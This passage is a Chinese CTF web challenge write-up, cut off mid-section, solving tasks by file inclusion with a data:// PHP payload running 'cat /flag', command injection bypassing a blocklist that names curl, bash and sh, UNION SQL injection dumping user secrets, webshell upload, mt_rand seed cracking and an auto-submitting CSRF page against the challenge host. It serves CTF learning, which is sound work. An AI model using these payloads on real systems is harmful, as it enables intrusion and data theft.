+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">SYC=~[];SYC=&#123;___:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC],__<span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>_:(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC],_<span class="hljs-symbol">$</span>_:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>:(SYC[SYC]+<span class="hljs-string">&quot;&quot;</span>)[SYC],_<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span>__:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>__:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span>___:++SYC,<span class="hljs-symbol">$</span>__<span class="hljs-symbol">$</span>:++SYC&#125;;SYC.<span class="hljs-symbol">$</span>_=(SYC.<span class="hljs-symbol">$</span>_=SYC+<span class="hljs-string">&quot;&quot;</span>)[SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>]+(SYC._<span class="hljs-symbol">$</span>=SYC.<span class="hljs-symbol">$</span>_[SYC.__<span class="hljs-symbol">$</span>])+(SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>=(SYC.<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC.__<span class="hljs-symbol">$</span>])+((!SYC)+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>]+(SYC.__=SYC.<span class="hljs-symbol">$</span>_[SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_])+(SYC.<span class="hljs-symbol">$</span>=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC.__<span class="hljs-symbol">$</span>])+(SYC._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span>_])+SYC.<span class="hljs-symbol">$</span>_[SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>]+SYC.__+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>;SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>=SYC.<span class="hljs-symbol">$</span>+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>]+SYC.__+SYC._+SYC.<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>;SYC.<span class="hljs-symbol">$</span>=(SYC.___)[SYC.<span class="hljs-symbol">$</span>_][SYC.<span class="hljs-symbol">$</span>_];SYC.<span class="hljs-symbol">$</span>(SYC.<span class="hljs-symbol">$</span>(SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>_+(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span>_]+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+SYC._<span class="hljs-symbol">$</span>_+SYC.__+<span class="hljs-string">&quot;(&#x27;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span>_+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&#123;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>__+<span class="hljs-string">&quot;@\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>__+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>__+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>__+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&#125;&#x27;);&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure>
+
+<p>猜测是JS代码，控制台执行一下</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004026.png" srcset="/img/loading.gif" lazyload alt="image-20221120120514076"></p>
+<h2 id="ezR-F-I"><a href="#ezR-F-I" class="headerlink" title="ezR_F_I"></a>ezR_F_I</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004027.png" srcset="/img/loading.gif" lazyload alt="image-20221120120916845"></p>
+<p>点开后</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/include.php?file=http:/</span><span class="hljs-regexp">/baidu.com/</span>robots.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004028.png" srcset="/img/loading.gif" lazyload alt="image-20221120121021468"></p>
+<p>在file变量后加了一个.html，可以用data协议rce</p>
+<p>payload：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004029.png" srcset="/img/loading.gif" lazyload alt="image-20221120121832764"></p>
+<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004030.png" srcset="/img/loading.gif" lazyload alt="image-20221120121944189"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">/*佛又曰：输羯吉摩伽无婆羯尼羯驮萨夜南楞婆唵遮参怛烁阿怛度怛唎谨栗南提萨楞度摩谨伽伽墀醯咩驮夜帝俱佛悉呼数写帝尼嚧蒙舍利沙室罚陀俱悉夜喝唵尼孕南写利驮卢罚谨蒙伊谨尼卢利伽豆地皤穆罚驮醯伽无菩钵输烁呼驮数数嚧摩阇钵咩菩卢栗阇室栗罚俱室写耶穆墀摩利楞数皤哆呼无罚埵羯钵怛唎埵吉夜尼帝佛帝墀南吉孕室写南孕怛参阇呼怛伽迦地呼嚧咩参谨南他佛尼利栗数喝呼怛耶啰摩那羯喝萨啰俱婆楞孕孕穆呼哆输伽室利参迦苏摩伊嚧埵罚豆佛写那帝楞室墀度罚娑佛陀豆萨吉埵尼醯尼咩穆伽呼尼伊嚧呼阇娑摩苏驮苏地孕唵苏沙利无伽伊写提曳谨帝栗参啰迦俱菩罚呼遮埵无伽舍萨提遮他南栗醯啰罚曳咩伊娑咩楞咩豆墀钵皤度那沙栗菩夜苏迦迦摩婆萨输舍南沙啰输阇怛佛钵吉那埵南皤度啰孕遮烁沙蒙输他帝婆谨舍沙菩阿地阇遮阿埵输醯怛参栗无羯怛婆参舍无他羯悉遮吉孕羯哆蒙呼阇苏舍曳萨耶悉尼羯提娑谨遮婆罚罚苏婆数钵烁豆利室栗提陀他沙输悉罚唵埵摩迦啰参羯喝伊咩哆菩萨谨唎伊陀孕尼驮尼楞哆提栗悉诃参数嚧啰输罚咩尼罚唵迦沙穆穆无夜哆萨醯孕阇参羯佛耶南夜孕陀驮地醯舍尼驮萨提豆罚伽数阿耶呼栗写遮啰醯利萨嚧豆婆娑唵皤舍伊栗地沙阇婆喝利钵阇皤豆驮迦萨伊摩那唵迦穆羯萨驮娑摩那钵墀卢无陀埵谨哆醯穆醯度提室蒙夜伽悉提醯伊摩尼陀嚧写栗悉舍萨谨嚧提钵啰钵写啰萨墀曳唎埵参耶墀啰那喝迦遮嚧咩苏啰提咩卢耶埵阇楞孕喝怛羯嚧哆俱悉哆阇迦埵呼参舍沙蒙度穆夜皤尼诃无陀那沙沙蒙谨皤尼提诃穆悉罚啰输豆利尼阿栗喝皤豆喝咩咩嚧室曳醯楞墀利那参伽嚧钵输曳墀陀诃婆曳唎孕伽尼楞室谨蒙数唎迦醯帝摩提那谨俱摩婆罚南地他穆唵卢菩尼婆嚧醯写唎遮啰南无俱菩他孕娑怛栗他提卢菩数喝他帝俱诃罚无佛怛醯悉夜唵墀度摩咩帝舍孕豆他醯阿醯南摩沙哆室唎伊烁利驮咩参曳数吉沙钵怛羯伽穆嚧俱提诃罚参那南写数羯驮萨提孕数驮罚栗蒙墀谨驮羯度孕娑摩娑尼豆遮怛提尼陀烁呼喝婆萨沙伊迦羯曳佛遮卢遮尼苏谨啰栗室提参喝吉怛卢墀墀蒙摩利咩萨诃娑罚阿穆地舍尼蒙孕喝皤萨他嚧卢迦输地阿利曳楞喝哆曳喝醯沙诃南舍罚罚数提皤咩南悉伊喝栗摩诃输苏咩啰提吉尼无啰伊咩羯栗菩嚧室那那吉室伽写输南娑输耶墀舍沙无地迦无度提陀穆苏驮利蒙帝菩豆伽豆陀数穆伽度墀室孕卢提啰迦墀那呼俱吉唎地哆夜豆怛喝迦摩皤俱孕阿吉曳烁那阿哆俱输尼穆唎帝他卢烁曳他谨地皤卢地佛苏喝悉唵羯参曳尼啰楞驮沙输耶钵他菩那无曳吉遮罚喝舍输参卢豆伊摩耶曳迦曳夜娑唎墀蒙卢俱喝帝摩度曳曳伊喝他无钵伽吉室唎地唎咩埵舍唵孕尼尼嚧羯呼遮耶室迦墀娑钵驮提伊醯呼室写唎舍参陀南俱摩耶度耶烁写萨萨无伊陀吉墀罚孕利埵那利摩伽钵楞地伽迦喝利他输皤曳卢迦沙怛地写卢伊埵孕诃呼蒙埵输婆写阿唎蒙婆婆萨俱沙栗悉那蒙伽卢诃夜罚输无菩他参写迦诃穆萨他菩皤醯咩孕墀耶室驮钵唵摩埵墀利阇利伽墀埵楞婆喝写埵尼迦吉咩婆陀沙婆喝咩阇室楞豆皤俱楞迦室悉阇婆钵呼阿唎沙迦驮悉烁楞那陀娑楞菩钵埵喝室卢陀俱舍楞钵蒙夜穆帝菩喝地诃提地夜无他阿嚧夜漫</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>   <br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="hljs-variable">$ip</span>,<span class="hljs-variable">$match</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 3 <span class="hljs-subst">$ip</span>&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>上面那个与佛论道我没有解出来，没找到对应的网站</p>
+<p>payload:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?i</span>p=%0atac<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;may_b3_y0u_can_pr0t3ct.p?p<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004031.png" srcset="/img/loading.gif" lazyload alt="image-20221120123318226"></p>
+<h2 id="WelcomeSQL"><a href="#WelcomeSQL" class="headerlink" title="WelcomeSQL"></a>WelcomeSQL</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004032.png" srcset="/img/loading.gif" lazyload alt="image-20221120123353883"></p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004033.png" srcset="/img/loading.gif" lazyload alt="image-20221120123427114"></p>
+<p>数字型联合注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004034.png" srcset="/img/loading.gif" lazyload alt="image-20221120124208519"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WelcomeSQL</span><br><span class="hljs-attribute">WelcomeSQL</span>,information_schema,mysql,performance_schema<br><span class="hljs-attribute">10</span>.<span class="hljs-number">2</span>.<span class="hljs-number">26</span>-MariaDB-log<br><br></code></pre></td></tr></table></figure>
+
+<p>如果语句报错会</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004035.png" srcset="/img/loading.gif" lazyload alt="image-20221120125340080"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;user_info&#x27;</span><br>id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,<span class="hljs-string">&#x27;---&#x27;</span>,username,<span class="hljs-string">&#x27;---&#x27;</span>,secret) <span class="hljs-keyword">from</span> WelcomeSQL.user_info<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004036.png" srcset="/img/loading.gif" lazyload alt="image-20221120130315264"></p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004037.png" srcset="/img/loading.gif" lazyload alt="image-20221120130609597"></p>
+<p>无任何过滤，直接上小马</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004038.png" srcset="/img/loading.gif" lazyload alt="image-20221120130737316"></p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004039.png" srcset="/img/loading.gif" lazyload alt="image-20221120130901812"></p>
+<h2 id="drinktea"><a href="#drinktea" class="headerlink" title="drinktea"></a>drinktea</h2><p>题目提示是想要买双皮奶，双皮奶需要VIP身份，并且</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">钱不够捏，要999999999999元<br></code></pre></td></tr></table></figure>
+
+<p>随便注册个账号</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004040.png" srcset="/img/loading.gif" lazyload alt="image-20221120131029910"></p>
+<p>开始是这样的</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004041.png" srcset="/img/loading.gif" lazyload alt="image-20221123101101810"></p>
+<p>index.php有hint</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004042.png" srcset="/img/loading.gif" lazyload alt="image-20221123100415595"></p>
+<p>mng.php</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">只有狮吼功继承人才能更改<span class="hljs-variable constant_">VIP</span>权限，用法示例： <span class="hljs-string">?n</span>ame=f4tb3e&amp;vip=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://mc.vveelin.com.cn:8102/report.php">http://mc.vveelin.com.cn:8102/report.php</a></p>
+<p>根据hint在源码发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- 其实这个反馈界面还在调试阶段捏，我前几天上班摸鱼了…… --&gt;<span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//真的随机吗？</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/seed&quot;</span>);<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-title function_ invoke__">mt_rand</span>();<span class="hljs-comment">//   == 1567320364</span><br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;random.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>伪随机数爆破一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">└─# ./php_mt_seed 1567320364                              <br>Pattern: EXACT<br>Version: 3.0.7 to 5.2.0<br>Found 0, trying 0xa8000000 - 0xabffffff, speed 10840.7 Mseeds/s <br>seed = 0xaa4cbfec = 2857156588 (PHP 3.0.7 to 5.2.0)<br>seed = 0xaa4cbfed = 2857156589 (PHP 3.0.7 to 5.2.0)<br>Found 2, trying 0xfc000000 - 0xffffffff, speed 10840.7 Mseeds/s <br>Version: 5.2.1+<br>Found 2, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s <br>seed = 0x000a2c2a = 666666 (PHP 7.1.0+)<br>Found 3, trying 0x16000000 - 0x17ffffff, speed 100.0 Mseeds/s <br>seed = 0x16b73644 = 381105732 (PHP 5.2.1 to 7.0.x; HHVM)<br>Found 4, trying 0xbe000000 - 0xbfffffff, speed 96.3 Mseeds/s <br>seed = 0xbf3e7fc3 = 3208544195 (PHP 7.1.0+)<br>Found 5, trying 0xfe000000 - 0xffffffff, speed 95.8 Mseeds/s <br>Found 5<br><br></code></pre></td></tr></table></figure>
+
+<p>一看就是666666，放在php7环境运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#666666</span><br><span class="hljs-variable">$seed</span>=<span class="hljs-number">666666</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-title function_ invoke__">mt_rand</span>();<span class="hljs-comment">//   == 1567320364</span><br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得到验证码：</p>
+<figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wasm">2bfd7154e1<span class="hljs-type">f32</span>7a42dae866bac9ecd45<br></code></pre></td></tr></table></figure>
+
+<p>通过反馈页面，可以进行CSRF。</p>
+<p>获取VIP exp：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">		<span class="hljs-keyword">function</span> <span class="hljs-title function_">evil</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">			<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">		&#125;</span><br><span class="language-javascript">	</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  	<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;evil()&quot;</span>,<span class="hljs-number">0.1</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://mc.vveelin.com.cn:8102/mng.php?name=admin&amp;vip=true&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postsubmit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这个exp生成的方法有很多，bp自带的CSRF生成工具也可以做，但是不能自动触发，我这里加了一个自动触发函数功能，只要打开，就会自动跳转。</p>
+<p>放在VPS上，将网址反馈给管理员：</p>
